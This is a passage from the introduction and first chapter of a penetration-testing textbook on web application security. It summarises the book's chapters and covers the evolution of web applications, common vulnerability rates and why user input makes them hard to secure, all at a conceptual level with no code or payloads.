we focus on ways to detect these vulnerabilities in web applications and look 
at some real-world examples of how these have arisen and been exploited.
Chapter 17, ‚ÄúAttacking Application Architecture,‚Äù examines an important area 
of web application security that is frequently overlooked. Many applications 
employ a tiered architecture. Failing to segregate different tiers properly often 
leaves an application vulnerable, enabling an attacker who has found a defect 
in one component to quickly compromise the entire application. A different 
range of threats arises in shared hosting environments, where defects or malicious code in one application can sometimes be exploited to compromise the 
environment itself and other applications running within it. This chapter also 
looks at the range of threats that arise in the kinds of shared hosting environments that have become known as ‚Äúcloud computing.‚Äù
Chapter 18, ‚ÄúAttacking the Application Server,‚Äù describes various ways in 
which you can target a web application by targeting the web server on which 
it is running. Vulnerabilities in web servers are broadly composed of defects in 
their confi guration and security fl aws within the web server software. This topic 
is on the boundary of the subjects covered in this book, because the web server 
is strictly a different component in the technology stack. However, most web 
applications are intimately bound up with the web server on which they run. 
Therefore, attacks against the web server are included in the book because they 
can often be used to compromise an application directly, rather than indirectly 
by fi rst compromising the underlying host.
Chapter 19, ‚ÄúFinding Vulnerabilities in Source Code,‚Äù describes a completely 
different approach to fi nding security fl aws than those described elsewhere 
within this book. In many situations it may be possible to review an application‚Äôs source code, not all of which requires cooperation from the application‚Äôs 
owner. Reviewing an application‚Äôs source code can often be highly effective in 
discovering vulnerabilities that would be diffi cult or time-consuming to detect 
by probing the running application. We describe a methodology, and provide 
a language-by-language cheat sheet, to enable you to perform an effective code 
review even if you have limited programming experience.
Chapter 20, ‚ÄúA Web Application Hacker‚Äôs Toolkit,‚Äù pulls together the various 
tools described in this book. These are the same tools the authors use when attacking real-world web applications. We examine the key features of these tools and 
describe in detail the type of work fl ow you generally need to employ to get the 
best out of them. We also examine the extent to which any fully automated tool 
flast.indd xxviii flast.indd xxviii 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxix
 Introduction xxix
can be effective in fi nding web application vulnerabilities. Finally, we provide 
some tips and advice for getting the most out of your toolkit.
Chapter 21, ‚ÄúA Web Application Hacker‚Äôs Methodology,‚Äù is a comprehensive 
and structured collation of all the procedures and techniques described in this 
book. These are organized and ordered according to the logical dependencies 
between tasks when you are carrying out an actual attack. If you have read 
about and understood all the vulnerabilities and techniques described in this 
book, you can use this methodology as a complete checklist and work plan 
when carrying out an attack against a web application.
What‚Äôs New in This Edition
In the four years since the fi rst edition of this book was published, much has 
changed, and much has stayed the same. The march of new technology has, of 
course, continued apace, and this has given rise to specifi c new vulnerabilities 
and attacks. The ingenuity of hackers has also led to the development of new 
attack techniques and new ways of exploiting old bugs. But neither of these 
factors, technological or human, has created a revolution. The technologies 
used in today‚Äôs applications have their roots in those that are many years old. 
And the fundamental concepts involved in today‚Äôs cutting-edge exploitation 
techniques are older than many of the researchers who are applying them so 
effectively. Web application security is a dynamic and exciting area to work in, 
but the bulk of what constitutes our accumulated wisdom has evolved slowly 
over many years. It would have been distinctively recognizable to practitioners 
working a decade or more ago.
This second edition is not a complete rewrite of the fi rst. Most of the material 
in the fi rst edition remains valid and current today. Approximately 30% of the 
content in this edition is either new or extensively revised. The remaining 70% 
has had minor modifi cations or none at all. If you have upgraded from the fi rst 
edition and feel disappointed by these numbers, you should take heart. If you 
have mastered all the techniques described in the fi rst edition, you already have 
the majority of the skills and knowledge you need. You can focus on what is 
new in this edition and quickly learn about the areas of web application security 
that have changed in recent years.
One signifi cant new feature of the second edition is the inclusion throughout the book of real examples of nearly all the vulnerabilities that are covered. 
Wherever you see a ‚ÄúTry It!‚Äù link, you can go online and work interactively 
with the example being discussed to confi rm that you can fi nd and exploit the 
vulnerability it contains. There are several hundred of these labs, which you 
can work through at your own pace as you read the book. The online labs are 
available on a subscription basis for a modest fee to cover the costs of hosting 
and maintaining the infrastructure involved.
flast.indd xxix flast.indd xxix 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxx
xxx Introduction
If you want to focus on what‚Äôs new in the second edition, here is a summary 
of the key areas where material has been added or rewritten:
Chapter 1, ‚ÄúWeb Application (In)security,‚Äù has been partly updated to refl ect 
new uses of web applications, some broad trends in technologies, and the ways 
in which a typical organization‚Äôs security perimeter has continued to change.
Chapter 2, ‚ÄúCore Defense Mechanisms,‚Äù has had minor changes. A few 
examples have been added of generic techniques for bypassing input validation defenses.
Chapter 3, ‚ÄúWeb Application Technologies,‚Äù has been expanded with some 
new sections describing technologies that are either new or that were described 
more briefl y elsewhere within the fi rst edition. The topics added include REST, 
Ruby on Rails, SQL, XML, web services, CSS, VBScript, the document object 
model, Ajax, JSON, the same-origin policy, and HTML5.
Chapter 4, ‚ÄúMapping the Application,‚Äù has received various minor updates 
to refl ect developments in techniques for mapping content and functionality.
Chapter 5, ‚ÄúBypassing Client-Side Controls,‚Äù has been updated more extensively. In particular, the section on browser extension technologies has been 
largely rewritten to include more detailed guidance on generic approaches to 
bytecode decompilation and debugging, how to handle serialized data in common formats, and how to deal with common obstacles to your work, including 
non-proxy-aware clients and problems with SSL. The chapter also now covers 
Silverlight technology.
Chapter 6, ‚ÄúAttacking Authentication,‚Äù remains current and has only minor 
updates.
Chapter 7, ‚ÄúAttacking Session Management,‚Äù has been updated to cover new 
tools for automatically testing the quality of randomness in tokens. It also contains 
new material on attacking encrypted tokens, including practical techniques for 
token tampering without knowing either the cryptographic algorithm or the 
encryption key being used.
Chapter 8, ‚ÄúAttacking Access Controls,‚Äù now covers access control vulnerabilities arising from direct access to server-side methods, and from platform 
misconfi guration where rules based on HTTP methods are used to control 
access. It also describes some new tools and techniques you can use to partially 
automate the frequently onerous task of testing access controls.
The material in Chapters 9 and 10 has been reorganized to create more manageable chapters and a more logical arrangement of topics. Chapter 9, ‚ÄúAttacking 
Data Stores,‚Äù focuses on SQL injection and similar attacks against other data 
store technologies. As SQL injection vulnerabilities have become more widely 
understood and addressed, this material now focuses more on practical situations where SQL injection is still found. There are also minor updates throughout to refl ect current technologies and attack methods. A new section on using 
automated tools for exploiting SQL injection vulnerabilities is included. The 
material on LDAP injection has been largely rewritten to include more detailed 
flast.indd xxx flast.indd xxx 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxxi
 Introduction xxxi
coverage of specifi c technologies (Microsoft Active Directory and OpenLDAP), 
as well as new techniques for exploiting common vulnerabilities. This chapter 
also now covers attacks against NoSQL.
Chapter 10, ‚ÄúAttacking Back-End Components,‚Äù covers the other types of 
server-side injection vulnerabilities that were previously included in Chapter 9. 
New sections cover XML external entity injection and injection into back-end 
HTTP requests, including HTTP parameter injection/pollution and injection 
into URL rewriting schemes.
Chapter 11, ‚ÄúAttacking Application Logic,‚Äù includes more real-world examples of 
common logic fl aws in input validation functions. With the increased usage 
of encryption to protect application data at rest, we also include an example of 
how to identify and exploit encryption oracles to decrypt encrypted data.
The topic of attacks against other application users, previously covered in 
Chapter 12, has been split into two chapters, because this material was becoming unmanageably large. Chapter 12, ‚ÄúAttacking Users: Cross-Site Scripting,‚Äù 
focuses solely on XSS. This material has been extensively updated in various 
areas. The sections on bypassing defensive fi lters to introduce script code have 
been completely rewritten to cover new techniques and technologies, including various little-known methods for executing script code on current browsers. There is also much more detailed coverage of methods for obfuscating 
script code to bypass common input fi lters. The chapter includes several new 
examples of real-world XSS attacks. A new section on delivering working XSS 
exploits in challenging conditions covers escalating an attack across application 
pages, exploiting XSS via cookies and the Referer header, and exploiting XSS 
in nonstandard request and response content such as XML. There is a detailed 
examination of browsers‚Äô built-in XSS fi lters and how these can be circumvented 
to deliver exploits. New sections discuss specifi c techniques for exploiting XSS 
in webmail applications and in uploaded fi les. Finally, there are various updates 
to the defensive measures that can be used to prevent XSS attacks.
The new Chapter 13, ‚ÄúAttacking Users: Other Techniques,‚Äù unites the remainder of this huge area. The topic of cross-site request forgery has been updated to 
include CSRF attacks against the login function, common defects in anti-CSRF 
defenses, UI redress attacks, and common defects in framebusting defenses. A 
new section on cross-domain data capture includes techniques for stealing data 
by injecting text containing nonscripting HTML and CSS, and various techniques for cross-domain data capture using JavaScript and E4X. A new section 
examines the same-origin policy in more detail, including its implementation 
in different browser extension technologies, the changes brought by HTML5, 
and ways of crossing domains via proxy service applications. There are new 
sections on client-side cookie injection, SQL injection, and HTTP parameter pollution. The section on client-side privacy attacks has been expanded to include 
storage mechanisms provided by browser extension technologies and HTML5. 
Finally, a new section has been added drawing together general attacks against 
flast.indd xxxi flast.indd xxxi 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxxii
xxxii Introduction
web users that do not depend on vulnerabilities in any particular application. 
These attacks can be delivered by any malicious or compromised web site or 
by an attacker who is suitably positioned on the network.
Chapter 14, ‚ÄúAutomating Customized Attacks,‚Äù has been expanded to cover 
common barriers to automation and how to circumvent them. Many applications 
employ defensive session-handling mechanisms that terminate sessions, use 
ephemeral anti-CSRF tokens, or use multistage processes to update application 
state. Some new tools are described for handling these mechanisms, which let 
you continue using automated testing techniques. A new section examines 
CAPTCHA controls and some common vulnerabilities that can often be exploited 
to circumvent them.
Chapter 15, ‚ÄúExploiting Information Disclosure,‚Äù contains new sections about 
XSS in error messages and exploiting decryption oracles.
Chapter 16, ‚ÄúAttacking Native Compiled Applications,‚Äù has not been updated.
Chapter 17, ‚ÄúAttacking Application Architecture,‚Äù has a new section about 
vulnerabilities that arise in cloud-based architectures, and updated examples 
of exploiting architecture weaknesses.
Chapter 18, ‚ÄúAttacking the Application Server,‚Äù contains several new examples 
of interesting vulnerabilities in application servers and platforms, including Jetty, 
the JMX management console, ASP.NET, Apple iDisk server, Ruby WEBrick web 
server, and Java web server. It also has a new section on practical approaches 
to circumventing web application fi rewalls.
Chapter 19, ‚ÄúFinding Vulnerabilities in Source Code,‚Äù has not been updated.
Chapter 20, ‚ÄúA Web Application Hacker‚Äôs Toolkit,‚Äù has been updated with 
details on the latest features of proxy-based tool suites. It contains new sections 
on how to proxy the traffi c of non-proxy-aware clients and how to eliminate SSL 
errors in browsers and other clients caused by the use of an intercepting proxy. 
This chapter contains a detailed description of the work fl ow that is typically 
employed when you test using a proxy-based tool suite. It also has a new discussion about current web vulnerability scanners and the optimal approaches 
to using these in different situations.
Chapter 21, ‚ÄúA Web Application Hacker‚Äôs Methodology,‚Äù has been updated 
to refl ect the new methodology steps described throughout the book.
Tools You Will Need
This book is strongly geared toward hands-on techniques you can use to attack 
web applications. After reading the book, you will understand the specifi cs of 
each individual task, what it involves technically, and why it helps you detect 
and exploit vulnerabilities. The book is emphatically not about downloading 
a tool, pointing it at a target application, and believing what the tool‚Äôs output 
tells you about the state of the application‚Äôs security.
flast.indd xxxii flast.indd xxxii 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxxiii
 Introduction xxxiii
That said, you will fi nd several tools useful, and sometimes indispensable, 
when performing the tasks and techniques we describe. All of these are available on the Internet. We recommend that you download and experiment with 
each tool as you read about it.
What‚Äôs on the Website
The companion website for this book at http://mdsec.net/wahh, which you can 
also link to from www/wiley.com/go/webhacker2e, contains several resources 
that you will fi nd useful in the course of mastering the techniques we describe 
and using them to attack actual applications. In particular, the website contains 
access to the following:
n Source code for some of the scripts we present in the book
n A list of current links to all the tools and other resources discussed in 
the book
n A handy checklist of the tasks involved in attacking a typical application
n Answers to the questions posed at the end of each chapter
n Hundreds of interactive vulnerability labs that are used in examples 
throughout this book and that are available on a subscription basis to 
help you develop and refi ne your skills
Bring It On
Web application security remains a fun and thriving subject. We enjoyed writing this book as much as we continue to enjoy hacking into web applications 
on a daily basis. We hope that you will also take pleasure from learning about 
the different techniques we describe and how you can defend against them.
Before going any further, we should mention an important caveat. In most 
countries, attacking computer systems without the owner‚Äôs permission is against 
the law. The majority of the techniques we describe are illegal if carried out 
without consent.
The authors are professional penetration testers who routinely attack web 
applications on behalf of clients to help them improve their security. In recent 
years, numerous security professionals and others have acquired criminal 
records ‚Äî and ended their careers ‚Äî by experimenting on or actively attacking computer systems without permission. We urge you to use the information 
contained in this book only for lawful purposes.
flast.indd xxxiii flast.indd xxxiii 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxxiv
flast.indd xxxiv flast.indd xxxiv 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard c01.indd V2 - 07/07/2011 Page 1
1
C H A P T E R 
1
Web Application (In)security
There is no doubt that web application security is a current and newsworthy 
subject. For all concerned, the stakes are high: for businesses that derive increasing revenue from Internet commerce, for users who trust web applications with 
sensitive information, and for criminals who can make big money by stealing 
payment details or compromising bank accounts. Reputation plays a critical role. 
Few people want to do business with an insecure website, so few organizations 
want to disclose details about their own security vulnerabilities or breaches. 
Hence, it is not a trivial task to obtain reliable information about the state of 
web application security today.
This chapter takes a brief look at how web applications have evolved and the 
many benefi ts they provide. We present some metrics about vulnerabilities in 
current web applications, drawn from the authors‚Äô direct experience, demonstrating that the majority of applications are far from secure. We describe the 
core security problem facing web applications ‚Äî that users can supply arbitrary 
input ‚Äî and the various factors that contribute to their weak security posture. 
Finally, we describe the latest trends in web application security and how these 
may be expected to develop in the near future.
c01.indd 1 c01.indd 1 8/19/2011 12:02:02 PM 8/19/2011 12:02:02 PM
Stuttard c01.indd V2 - 07/07/2011 Page 2
2 Chapter 1 n Web Application (In)security
The Evolution of Web Applications
In the early days of the Internet, the World Wide Web consisted only of web 
sites. These were essentially information repositories containing static documents. Web browsers were invented as a means of retrieving and displaying 
those documents, as shown in Figure 1-1. The fl ow of interesting information 
was one-way, from server to browser. Most sites did not authenticate users, 
because there was no need to. Each user was treated in the same way and was 
presented with the same information. Any security threats arising from hosting a website were related largely to vulnerabilities in web server software (of 
which there were many). If an attacker compromised a web server, he usually 
would not gain access to any sensitive information, because the information 
held on the server was already open to public view. Rather, an attacker typically 
would modify the fi les on the server to deface the web site‚Äôs contents or use the 
server‚Äôs storage and bandwidth to distribute ‚Äúwarez.‚Äù
Figure 1-1: A traditional website containing static information
Today, the World Wide Web is almost unrecognizable from its earlier form. 
The majority of sites on the web are in fact applications (see Figure 1-2). They 
are highly functional and rely on two-way fl ow of information between the 
server and browser. They support registration and login, fi nancial transactions, 
c01.indd 2 c01.indd 2 8/19/2011 12:02:02 PM 8/19/2011 12:02:02 PM
Stuttard c01.indd V2 - 07/07/2011 Page 3
 Chapter 1 n Web Application (In)security 3
search, and the authoring of content by users. The content presented to users 
is generated dynamically on the fl y and is often tailored to each specifi c user. 
Much of the information processed is private and highly sensitive. Security, 
therefore, is a big issue. No one wants to use a web application if he believes 
his information will be disclosed to unauthorized parties.
Figure 1-2: A typical web application
Web applications bring with them new and signifi cant security threats. Each 
application is different and may contain unique vulnerabilities. Most applications are developed in-house ‚Äî many by developers who have only a partial 
understanding of the security problems that may arise in the code they are 
producing. To deliver their core functionality, web applications normally require 
connectivity to internal computer systems that contain highly sensitive data and 
that can perform powerful business functions. Fifteen years ago, if you wanted 
to make a funds transfer, you visited your bank, and the teller performed the 
transfer for you; today, you can visit a web application and perform the transfer 
yourself. An attacker who compromises a web application may be able to steal 
personal information, carry out fi nancial fraud, and perform malicious actions 
against other users.
c01.indd 3 c01.indd 3 8/19/2011 12:02:02 PM 8/19/2011 12:02:02 PM
Stuttard c01.indd V2 - 07/07/2011 Page 4
4 Chapter 1 n Web Application (In)security
Common Web Application Functions
Web applications have been created to perform practically every useful function 
you could possibly implement online. Here are some web application functions 
that have risen to prominence in recent years:
n Shopping (Amazon)
n Social networking (Facebook)
n Banking (Citibank)
n Web search (Google)
n Auctions (eBay)
n Gambling (Betfair)
n Web logs (Blogger)
n Web mail (Gmail)
n Interactive information (Wikipedia)
Applications that are accessed using a computer browser increasingly overlap 
with mobile applications that are accessed using a smartphone or tablet. Most 
mobile applications employ either a browser or a customized client that uses 
HTTP-based APIs to communicate with the server. Application functions and 
data typically are shared between the various interfaces that the application 
exposes to different user platforms.
In addition to the public Internet, web applications have been widely adopted 
inside organizations to support key business functions. Many of these provide 
access to highly sensitive data and functionality:
n HR applications allowing users to access payroll information, give and 
receive performance feedback, and manage recruitment and disciplinary 
procedures.
n Administrative interfaces to key infrastructure such as web and mail 
servers, user workstations, and virtual machine administration.
n Collaboration software used for sharing documents, managing workfl ow and projects, and tracking issues. These types of functionality often 
involve critical security and governance issues, and organizations often 
rely completely on the controls built into their web applications.
n Business applications such as enterprise resource planning (ERP) software, 
which previously were accessed using a proprietary thick-client application, can now be accessed using a web browser.
c01.indd 4 c01.indd 4 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 5
 Chapter 1 n Web Application (In)security 5
n Software services such as e-mail, which originally required a separate 
e-mail client, can now be accessed via web interfaces such as Outlook 
Web Access.
n Traditional desktop offi ce applications such as word processors and spreadsheets have been migrated to web applications through services such as 
Google Apps and Microsoft Offi ce Live.
In all these examples, what are perceived as ‚Äúinternal‚Äù applications are increasingly being hosted externally as organizations move to outside service providers 
to cut costs. In these so-called cloud solutions, business-critical functionality 
and data are opened to a wider range of potential attackers, and organizations 
are increasingly reliant on the integrity of security defenses that are outside of 
their control.
The time is fast approaching when the only client software that most computer users will need is a web browser. A diverse range of functions will have 
been implemented using a shared set of protocols and technologies, and in so 
doing will have inherited a distinctive range of common security vulnerabilities.
Benefi ts of Web Applications
It is not diffi cult to see why web applications have enjoyed such a dramatic rise 
to prominence. Several technical factors have worked alongside the obvious 
commercial incentives to drive the revolution that has occurred in how we use 
the Internet:
n HTTP, the core communications protocol used to access the World Wide 
Web, is lightweight and connectionless. This provides resilience in the 
event of communication errors and avoids the need for the server to 
hold open a network connection to every user, as was the case in many 
legacy client/server applications. HTTP can also be proxied and tunneled 
over other protocols, allowing for secure communication in any network 
confi guration.
n Every web user already has a browser installed on his computer and 
mobile device. Web applications deploy their user interface dynamically 
to the browser, avoiding the need to distribute and manage separate 
client software, as was the case with pre-web applications. Changes to 
the interface need to be implemented only once, on the server, and take 
effect immediately.
n Today‚Äôs browsers are highly functional, enabling rich and satisfying 
user interfaces to be built. Web interfaces use standard navigational and 
c01.indd 5 c01.indd 5 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 6
6 Chapter 1 n Web Application (In)security
input controls that are immediately familiar to users, avoiding the need 
to learn how each individual application functions. Client-side scripting 
enables applications to push part of their processing to the client side, and 
browsers‚Äô capabilities can be extended in arbitrary ways using browser 
extension technologies where necessary.
n The core technologies and languages used to develop web applications are 
relatively simple. A wide range of platforms and development tools are 
available to facilitate the development of powerful applications by relative 
beginners, and a large quantity of open source code and other resources 
is available for incorporation into custom-built applications.
Web Application Security
As with any new class of technology, web applications have brought with them 
a new range of security vulnerabilities. The set of most commonly encountered 
defects has evolved somewhat over time. New attacks have been conceived 
that were not considered when existing applications were developed. Some 
problems have become less prevalent as awareness of them has increased. New 
technologies have been developed that have introduced new possibilities for 
exploitation. Some categories of fl aws have largely gone away as the result of 
changes made to web browser software.
The most serious attacks against web applications are those that expose 
sensitive data or gain unrestricted access to the back-end systems on which 
the application is running. High-profi le compromises of this kind continue 
to occur frequently. For many organizations, however, any attack that causes 
system downtime is a critical event. Application-level denial-of-service attacks 
can be used to achieve the same results as traditional resource exhaustion 
attacks against infrastructure. However, they are often used with more subtle 
techniques and objectives. They may be used to disrupt a particular user or 
service to gain a competitive edge against peers in the realms of fi nancial trading, gaming, online bidding, and ticket reservations.
Throughout this evolution, compromises of prominent web applications have 
remained in the news. There is no sense that a corner has been turned and that 
these security problems are on the wane. By some measure, web application 
security is today the most signifi cant battleground between attackers and those 
with computer resources and data to defend, and it is likely to remain so for 
the foreseeable future.
c01.indd 6 c01.indd 6 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 7
 Chapter 1 n Web Application (In)security 7
‚ÄúThis Site Is Secure‚Äù
There is a widespread awareness that security is an issue for web applications. 
Consult the FAQ page of a typical application, and you will be reassured that 
it is in fact secure.
Most applications state that they are secure because they use SSL. For example:
This site is absolutely secure. It has been designed to use 128-bit Secure Socket 
Layer (SSL) technology to prevent unauthorized users from viewing any of your 
information. You may use this site with peace of mind that your data is safe with us.
Users are often urged to verify the site‚Äôs certifi cate, admire the advanced 
cryptographic protocols in use, and, on this basis, trust it with their personal 
information.
Increasingly, organizations also cite their compliance with Payment Card 
Industry (PCI) standards to reassure users that they are secure. For example:
We take security very seriously. Our web site is scanned daily to ensure that we 
remain PCI compliant and safe from hackers. You can see the date of the latest scan 
on the logo below, and you are guaranteed that our web site is safe to use.
In fact, the majority of web applications are insecure, despite the widespread 
usage of SSL technology and the adoption of regular PCI scanning. The authors 
of this book have tested hundreds of web applications in recent years. Figure 1-3 
shows what percentage of applications tested during 2007 and 2011 were found 
to be affected by some common categories of vulnerability:
n Broken authentication (62%) ‚Äî This category of vulnerability encompasses various defects within the application‚Äôs login mechanism, which 
may enable an attacker to guess weak passwords, launch a brute-force 
attack, or bypass the login.
n Broken access controls (71%) ‚Äî This involves cases where the application 
fails to properly protect access to its data and functionality, potentially 
enabling an attacker to view other users‚Äô sensitive data held on the server 
or carry out privileged actions.
n SQL injection (32%) ‚Äî This vulnerability enables an attacker to submit 
crafted input to interfere with the application‚Äôs interaction with back-end 
databases. An attacker may be able to retrieve arbitrary data from the 
application, interfere with its logic, or execute commands on the database 
server itself.
c01.indd 7 c01.indd 7 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 8
8 Chapter 1 n Web Application (In)security
n Cross-site scripting (94%) ‚Äî This vulnerability enables an attacker to 
target other users of the application, potentially gaining access to their 
data, performing unauthorized actions on their behalf, or carrying out 
other attacks against them.
n Information leakage (78%) ‚Äî This involves cases where an application 
divulges sensitive information that is of use to an attacker in developing 
an assault against the application, through defective error handling or 
other behavior.
n Cross-site request forgery (92%) ‚Äî This fl aw means that application 
users can be induced to perform unintended actions on the application 
within their user context and privilege level. The vulnerability allows a 
malicious web site visited by the victim user to interact with the application to perform actions that the user did not intend.
Figure 1-3: The incidence of some common web application vulnerabilities in 
applications recently tested by the authors (based on a sample of more than 100)
92%
78%
94%
32%
71%
62%
0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100%
Cross-site request
forgery
Information leakage
Cross-site scripting
SQL injection
Broken access controls
Broken authentication
Incidence in recently tested applications
SSL is an excellent technology that protects the confi dentiality and integrity 
of data in transit between the user‚Äôs browser and the web server. It helps defend 
against eavesdroppers, and it can provide assurance to the user of the identity of 
the web server he is dealing with. But it does not stop attacks that directly target 
the server or client components of an application, as most successful attacks do. 
Specifi cally, it does not prevent any of the vulnerabilities just listed, or many 
others that can render an application critically exposed to attack. Regardless of 
whether they use SSL, most web applications still contain security fl aws.
c01.indd 8 c01.indd 8 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 9
 Chapter 1 n Web Application (In)security 9
The Core Security Problem: Users Can Submit 
Arbitrary Input
As with most distributed applications, web applications face a fundamental 
problem they must address to be secure. Because the client is outside of the 
application‚Äôs control, users can submit arbitrary input to the server-side application. The application must assume that all input is potentially malicious. 
Therefore, it must take steps to ensure that attackers cannot use crafted input 
to compromise the application by interfering with its logic and behavior, thus 
gaining unauthorized access to its data and functionality.
This core problem manifests itself in various ways:
n Users can interfere with any piece of data transmitted between the client 
and the server, including request parameters, cookies, and HTTP headers. Any security controls implemented on the client side, such as input 
validation checks, can be easily circumvented.
n Users can send requests in any sequence and can submit parameters at a 
different stage than the application expects, more than once, or not at all. 
Any assumption developers make about how users will interact with the 
application may be violated.
n Users are not restricted to using only a web browser to access the application. 
Numerous widely available tools operate alongside, or independently of, 
a browser to help attack web applications. These tools can make requests 
that no browser would ordinarily make and can generate huge numbers 
of requests quickly to fi nd and exploit problems.
The majority of attacks against web applications involve sending input to the 
server that is crafted to cause some event that was not expected or desired by 
the application‚Äôs designer. Here are some examples of submitting crafted input 
to achieve this objective:
n Changing the price of a product transmitted in a hidden HTML form fi eld 
to fraudulently purchase the product for a cheaper amount
n Modifying a session token transmitted in an HTTP cookie to hijack the 
session of another authenticated user
n Removing certain parameters that normally are submitted to exploit a 
logic fl aw in the application‚Äôs processing
n Altering some input that will be processed by a back-end database to inject 
a malicious database query and access sensitive data
Needless to say, SSL does nothing to stop an attacker from submitting crafted 
input to the server. If the application uses SSL, this simply means that other users 
on the network cannot view or modify the attacker‚Äôs data in transit. Because 
c01.indd 9 c01.indd 9 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 10
10 Chapter 1 n Web Application (In)security
the attacker controls her end of the SSL tunnel, she can send anything she likes 
to the server through this tunnel. If any of the previously mentioned attacks 
are successful, the application is emphatically vulnerable, regardless of what 
its FAQ may tell you.
Key Problem Factors
The core security problem faced by web applications arises in any situation 
where an application must accept and process untrusted data that may be malicious. However, in the case of web applications, several factors have combined 
to exacerbate the problem and explain why so many web applications on the 
Internet today do such a poor job of addressing it.
Underdeveloped Security Awareness
Although awareness of web application security issues has grown in recent 
years, it remains less well-developed than in longer-established areas such as 
networks and operating systems. Although most people working in IT security 
have a reasonable grasp of the essentials of securing networks and hardening 
hosts, widespread confusion and misconception still exist about many of the 
core concepts involved in web application security. A web application developer‚Äôs work increasingly involves weaving together tens, or even hundreds, 
of third-party packages, all designed to abstract the developer away from the 
underlying technologies. It is common to meet experienced web application 
developers who make major assumptions about the security provided by their 
programming framework and to whom an explanation of many basic types of 
fl aws comes as a revelation. 
Custom Development
Most web applications are developed in-house by an organization‚Äôs own staff 
or third-party contractors. Even where an application employs well-established 
components, these are typically customized or bolted together using new code. 
In this situation, every application is different and may contain its own unique 
defects. This stands in contrast to a typical infrastructure deployment, in which 
an organization can purchase a best-of-breed product and install it in line with 
industry-standard guidelines.
Deceptive Simplicity
With today‚Äôs web application platforms and development tools, it is possible for 
a novice programmer to create a powerful application from scratch in a short 
period of time. But there is a huge difference between producing code that is 
c01.indd 10 c01.indd 10 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 11
 Chapter 1 n Web Application (In)security 11
functional and code that is secure. Many web applications are created by wellmeaning individuals who simply lack the knowledge and experience to identify 
where security problems may arise.
A prominent trend in recent years has been the use of application frameworks 
that provide ready-made code components to handle numerous common areas 
of functionality, such as authentication, page templates, message boards, and 
integration with common back-end infrastructure components. Examples of these 
frameworks include Liferay and Appfuse. These products make it quick and 
easy to create working applications without requiring a technical understanding 
of how the applications work or the potential risks they may contain. This also 
means many companies use the same frameworks. Thus, when a vulnerability 
is discovered, it affects many unrelated applications.
Rapidly Evolving Threat Profi le
Research into web application attacks and defenses continues to be a thriving 
area in which new concepts and threats are conceived at a faster rate than is now 
the case for older technologies. Particularly on the client side, it is common for 
the accepted defenses against a particular attack to be undermined by research 
that demonstrates a new attack technique. A development team that begins a 
project with a complete knowledge of current threats may have lost this status 
by the time the application is completed and deployed.
Resource and Time Constraints
Most web application development projects are subject to strict constraints on 
time and resources, arising from the economics of in-house, one-off development. In most organizations, it is often infeasible to employ dedicated security 
expertise in the design or development teams. And due to project slippage, 
security testing by specialists is often left until very late in the project‚Äôs life 
cycle. In the balancing of competing priorities, the need to produce a stable and 
functional application by a deadline normally overrides less tangible security 
considerations. A typical small organization may be willing to pay for only a 
few man-days of consulting time to evaluate a new application. A quick penetration test will often fi nd the low-hanging fruit, but it may miss more subtle 
vulnerabilities that require time and patience to identify.
Overextended Technologies
Many of the core technologies employed in web applications began life when 
the landscape of the World Wide Web was very different. They have since been 
pushed far beyond the purposes for which they were originally conceived, such 
as the use of JavaScript as a means of data transmission in many AJAX-based 
c01.indd 11 c01.indd 11 8/19/2011 12:02:03 PM 8/19/2011 12:02:03 PM
Stuttard c01.indd V2 - 07/07/2011 Page 12
12 Chapter 1 n Web Application (In)security
applications. As the expectations placed on web application functionality have 
rapidly evolved, the technologies used to implement this functionality have 
lagged behind the curve, with old technologies stretched and adapted to meet 
new requirements. Unsurprisingly, this has led to security vulnerabilities as 
unforeseen side effects emerge.
Increasing Demands on Functionality
Applications are designed primarily with functionality and usability in mind. 
Once-static user profi les now contain social networking features, allowing uploading of pictures and wiki-style editing of pages. A few years ago an application 
designer may have been content with implementing a username and password 
challenge to create the login functionality. Modern sites may include password 
recovery, username recovery, password hints, and an option to remember the 
username and password on future visits. Such a site would undoubtedly be 
promoted as having numerous security features, yet each one is really a selfservice feature adding to the site‚Äôs attack surface.
The New Security Perimeter
Before the rise of web applications, organizations‚Äô efforts to secure themselves 
against external attack were largely focused on the network perimeter. Defending 
this perimeter entailed hardening and patching the services it needed to expose 
and fi rewalling access to others.
Web applications have changed all this. For an application to be accessible 
by its users, the perimeter fi rewall must allow inbound connections to the 
server over HTTP or HTTPS. And for the application to function, the server 
must be allowed to connect to supporting back-end systems, such as databases, 
mainframes, and fi nancial and logistical systems. These systems often lie at 
the core of the organization‚Äôs operations and reside behind several layers of 
network-level defenses.
If a vulnerability exists within a web application, an attacker on the public 
Internet may be able to compromise the organization‚Äôs core back-end systems 
solely by submitting crafted data from his web browser. This data sails past all 
the organization‚Äôs network defenses, in the same way as does ordinary, benign 
traffi c to the web application.
The effect of widespread deployment of web applications is that the security 
perimeter of a typical organization has moved. Part of that perimeter is still 
embodied in fi rewalls and bastion hosts. But a signifi cant part of it is now occupied 
by the organization‚Äôs web applications. Because of the manifold ways in which 
web applications receive user input and pass this to sensitive back-end systems, 
